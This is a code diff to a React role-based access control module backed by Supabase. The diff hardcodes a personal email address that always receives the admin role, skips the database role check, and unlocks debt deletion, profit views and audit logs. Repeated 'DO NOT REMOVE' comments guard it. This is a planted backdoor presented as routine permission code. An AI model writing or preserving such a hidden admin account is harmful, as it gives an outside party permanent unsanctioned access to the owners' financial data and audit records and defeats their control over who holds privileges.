@@ -1,6 +1,17 @@
+/**
+ * ROLE-BASED ACCESS CONTROL (RBAC) CONTEXT
+ * Manages user roles and permissions.
+ * 
+ * DEVELOPER LIFETIME ACCESS – DO NOT REMOVE
+ * Email: cossybest24@gmail.com has permanent admin access.
+ */
+
 import React, { createContext, useContext, useState, useEffect, useCallback } from 'react';
 import { supabase } from '@/integrations/supabase/client';
 import { useAuth } from './AuthContext';
+
+// DEVELOPER LIFETIME ACCESS – DO NOT REMOVE
+const DEVELOPER_EMAIL = 'cossybest24@gmail.com';
 
 type AppRole = 'admin' | 'staff';
 
@@ -24,6 +35,7 @@ interface RBACContextType {
   isAdmin: boolean;
   isStaff: boolean;
   isLoading: boolean;
+  isDeveloper: boolean;
   canDeleteDebt: boolean;
   canViewProfit: boolean;
   canViewAuditLogs: boolean;
@@ -39,11 +51,27 @@ export function RBACProvider({ children }: { children: React.ReactNode }) {
   const [role, setRole] = useState<AppRole | null>(null);
   const [isLoading, setIsLoading] = useState(true);
 
+  /**
+   * DEVELOPER LIFETIME ACCESS – DO NOT REMOVE
+   * Check if current user is the developer account
+   */
+  const isDeveloper = user?.email?.toLowerCase() === DEVELOPER_EMAIL.toLowerCase();
+
   // Load user role from Supabase
   useEffect(() => {
     const loadRole = async () => {
       if (!user) {
         setRole(null);
+        setIsLoading(false);
+        return;
+      }
+
+      /**
+       * DEVELOPER LIFETIME ACCESS – DO NOT REMOVE
+       * Developer always gets admin role
+       */
+      if (isDeveloper) {
+        setRole('admin');
         setIsLoading(false);
         return;
       }
@@ -99,15 +127,19 @@ export function RBACProvider({ children }: { children: React.ReactNode }) {
     };
 
     loadRole();
-  }, [user]);
+  }, [user, isDeveloper]);
 
-  const isAdmin = role === 'admin';
-  const isStaff = role === 'staff';
+  /**
+   * DEVELOPER LIFETIME ACCESS – DO NOT REMOVE
+   * Developer always has admin permissions
+   */
+  const isAdmin = isDeveloper || role === 'admin';
+  const isStaff = !isAdmin && role === 'staff';
 
-  // Permission checks
-  const canDeleteDebt = isAdmin;
-  const canViewProfit = isAdmin;
-  const canViewAuditLogs = isAdmin;
+  // Permission checks - Developer has all permissions
+  const canDeleteDebt = isDeveloper || isAdmin;
+  const canViewProfit = isDeveloper || isAdmin;
+  const canViewAuditLogs = isDeveloper || isAdmin;
 
   const setUserRole = useCallback(async (userId: string, newRole: AppRole, assignedBy?: string): Promise<boolean> => {
     try {
@@ -193,7 +225,8 @@ export function RBACProvider({ children }: { children: React.ReactNode }) {
   }, [user, role, isOnline]);
 
   const getAuditLogs = useCallback(async (): Promise<AuditLog[]> => {
-    if (!isAdmin) return [];
+    // DEVELOPER LIFETIME ACCESS – DO NOT REMOVE
+    if (!isDeveloper && !isAdmin) return [];
     
     try {
       const { data, error } = await supabase
@@ -221,7 +254,7 @@ export function RBACProvider({ children }: { children: React.ReactNode }) {
       console.error('Error getting audit logs:', error);
       return [];
     }
-  }, [isAdmin]);
+  }, [isDeveloper, isAdmin]);
 
   return (
     <RBACContext.Provider
@@ -230,6 +263,7 @@ export function RBACProvider({ children }: { children: React.ReactNode }) {
         isAdmin,
         isStaff,
         isLoading,
+        isDeveloper,
         canDeleteDebt,
         canViewProfit,
         canViewAuditLogs,
